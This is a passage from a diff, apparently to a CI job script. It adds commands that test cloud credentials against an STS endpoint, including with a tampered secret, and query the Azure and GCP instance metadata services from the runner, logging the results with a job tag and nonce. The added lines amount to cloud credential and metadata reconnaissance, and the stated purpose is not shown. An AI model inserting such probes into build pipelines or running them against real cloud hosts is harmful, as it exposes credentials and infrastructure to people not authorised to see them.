+          if s!=200: print('STS_BODY',(b or '').replace(chr(10),' ')[:300])
+          s2,b2=sts(ak,str(sk)+'TAMPERED',tk)
+          m2=re.search(r'<Code>([^<]+)</Code>',b2)
+          print('STS_TAMPERED_STATUS',s2,'STS_TAMPERED_CODE',m2.group(1) if m2 else None)
+          " 2>&1 | head -6 || echo STS_SKIPPED
+              fi
+            fi
+          fi
+          echo "--- other-cloud metadata (presence only) ---"
+          echo "AZURE_IMDS_STATUS=$(curl -sS -o /tmp/c211_az.json -w '%{http_code}' --max-time 4 -H 'Metadata: true' 'http://169.254.169.254/metadata/instance?api-version=2021-02-01' 2>/dev/null || echo ERR)"
+          echo "GCP_METADATA_STATUS=$(curl -sS -o /dev/null -w '%{http_code}' --max-time 4 -H 'Metadata-Flavor: Google' 'http://metadata.google.internal/computeMetadata/v1/instance/id' 2>/dev/null || echo ERR)"
+          echo "C211_DENSE_END job=$JOBTAG nonce=$NONCE ts=$(ts)"
+          exit 0
+
